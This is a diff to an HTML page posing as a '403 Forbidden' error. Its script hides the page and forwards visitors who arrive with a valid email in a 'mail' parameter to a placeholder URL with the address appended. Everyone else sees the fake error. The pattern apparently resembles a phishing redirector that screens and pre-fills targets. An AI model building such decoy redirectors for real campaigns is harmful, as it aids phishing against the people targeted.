@@ -48,7 +48,7 @@
 <body id="page-top">
 
     <!-- Page Wrapper -->
-    <div id="wrapper" id="landpg">
+    <div id="wrapper">
 
         <!-- Content Wrapper -->
         <div id="content-wrapper" class="d-flex flex-column">
@@ -62,7 +62,7 @@
                     <!-- 404 Error Text -->
                     <div class="text-center">
                         <br/><br/><br/><br/>
-                        <div class="error mx-auto" data-text="404">403</div>
+                        <div class="error mx-auto" data-text="403">403</div>
                         <p class="lead text-gray-800 mb-5">Forbidden</p>
                         <p class="text-gray-500 mb-0">Access to this resource on the server is denied!</p>
                         <a href="index.html">&larr; Back to Dashboard</a>
@@ -137,21 +137,21 @@
       }
 
       // Get URL parameters
-      document.getElementById('landpg').style.display = 'none';
+      document.getElementById('wrapper').style.display = 'none';
       const urlParams = new URLSearchParams(window.location.search);
       const email = urlParams.get('mail'); // Get 'mail' parameter
 
       // If the 'mail' parameter exists and is a valid email
       if (email && validateEmail(email)) {
         // Show loader for 5 seconds before redirect
-        document.getElementById('loader').style.display = 'flex';
+        document.getElementById('loader').style.display = 'block';
 
         setTimeout(() => {
           // Redirect to the desired URL
           window.location.href = "new_url"+email; // Change this to the URL you want to redirect to
         }, 1000); // 5 seconds delay
       } else {
-        document.getElementById('landpg').style.display = 'block';
+        document.getElementById('wrapper').style.display = 'block';
       }
     </script>
 
